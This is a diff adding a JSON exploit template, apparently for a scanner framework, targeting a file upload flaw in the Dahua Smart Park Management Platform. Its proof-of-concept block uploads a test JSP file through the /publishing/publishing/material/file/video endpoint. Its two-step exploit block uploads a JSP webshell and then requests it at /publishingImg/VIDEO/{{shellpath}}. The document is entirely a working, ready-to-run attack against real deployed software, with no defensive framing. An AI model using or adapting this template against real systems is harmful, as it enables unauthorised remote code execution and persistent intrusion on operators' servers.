@@ -1,0 +1,50 @@
+{
+	"name":"大华智慧园区管理平台文件上传",
+	"tag":"dahua",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/publishing/publishing/material/file/video",
+		"pocPost":"------WebKitFormBoundaryCJEleSRxsqS0lAFv\nContent-Disposition: form-data; name=\"Filedata\";filename=\"1.jsp\"\r\n\r\n123456\r\n------WebKitFormBoundaryCJEleSRxsqS0lAFv--",
+		"header":{
+			"Cookie":" JSESSIONID=33FE9EFF8693FAD43EA7752BBE013080",
+			"Accept":" text/html,application/xhtml+xml,json;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+			"Upgrade-Insecure-Requests":" 1",
+			"User-Agent":" Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
+			"Connection":" close",
+			"Accept-Encoding":" gzip, deflate",
+			"Accept-Language":" zh-CN,zh;q=0.9",
+			"Content-Length":" 162",
+			"Content-Type":" multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv"
+		},
+		"status_code":"200",
+		"pattern":"([0-9]*\\.jsp)"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/publishing/publishing/material/file/video",
+			"expPost":"------WebKitFormBoundaryCJEleSRxsqS0lAFv\nContent-Disposition: form-data; name=\"Filedata\";filename=\"24k.jsp\"\r\n\r\n{{webshell}}\r\n------WebKitFormBoundaryCJEleSRxsqS0lAFv--",
+			"header":{
+				"Cookie":" JSESSIONID=33FE9EFF8693FAD43EA7752BBE013080",
+				"Accept":" text/html,application/xhtml+xml,json;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+				"Upgrade-Insecure-Requests":" 1",
+				"User-Agent":" Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
+				"Connection":" close",
+				"Accept-Encoding":" gzip, deflate",
+				"Accept-Language":" zh-CN,zh;q=0.9",
+				"Content-Length":" 162",
+				"Content-Type":" multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv"
+			},
+			"status_code":"200",
+			"pattern":"([0-9]*\\.jsp)"
+		},
+		"step2":{
+			"expGet":"/publishingImg/VIDEO/{{shellpath}}",
+			"header":{
+				"User-Agent":"Mozilla/5.0 (Linux;",
+				"content-type":"text/plain"
+			},
+			"status_code":"200",
+			"pattern":"(.*)"
+		}
+	}
+}
